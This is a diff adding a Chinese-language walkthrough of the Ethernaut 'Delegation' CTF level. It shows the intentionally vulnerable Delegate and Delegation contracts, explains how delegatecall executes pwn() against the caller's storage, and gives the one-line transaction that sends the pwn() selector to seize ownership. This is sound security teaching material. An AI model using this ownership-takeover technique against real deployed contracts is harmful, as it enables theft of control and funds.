@@ -275,3 +275,55 @@ function transfer(address _to, uint256 _value) public returns (bool) {
 ```solidity
 await contract.transfer(contract.address,21)
 ```
+
+# Delegation
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Delegate {
+    address public owner;
+
+    constructor(address _owner) {
+        owner = _owner;
+    }
+
+    function pwn() public {
+        owner = msg.sender;
+    }
+}
+
+contract Delegation {
+    address public owner;
+    Delegate delegate;
+
+    constructor(address _delegateAddress) {
+        delegate = Delegate(_delegateAddress);
+        owner = msg.sender;
+    }
+
+    fallback() external {
+        (bool result,) = address(delegate).delegatecall(msg.data);
+        if (result) {
+            this;
+        }
+    }
+}
+```
+这道智能合约题目主要涉及了两个合约 Delegate 和 Delegation，考察了 Solidity 中 delegatecall 的使用及其潜在的安全风险。
+- delegatecall 是 Solidity 中的一种特殊调用方式，允许一个合约在另一个合约的上下文（包括存储和地址空间）中执行代码。也就是说，delegatecall 执行的是目标合约（这里是 Delegate）的代码，但所有的状态变量和上下文（包括 msg.sender 和 msg.value）是当前合约（即 Delegation）的。
+- 因此，在 Delegation 合约中，如果外部传递的数据与 Delegate 中的 pwn 函数匹配，delegatecall 将会执行 Delegate 中的 pwn 函数，但操作的是 Delegation 合约的存储。换句话说，pwn 函数中的 owner = msg.sender 将会更改 Delegation 合约的 owner，而不是 Delegate 合约的 owner。
+
+使用:[abi encoder](https://emn178.github.io/online-tools/keccak_256.html) 计算 `pwn()` 的 abi signatur（前4个字节）`dd365b8b`；
+```js
+await contract.sendTransaction({data:'dd365b8b'})
+```
+此外：
+```solidity
+if (result) {
+            this;
+        }
+```
+这段代码似乎无用？
+
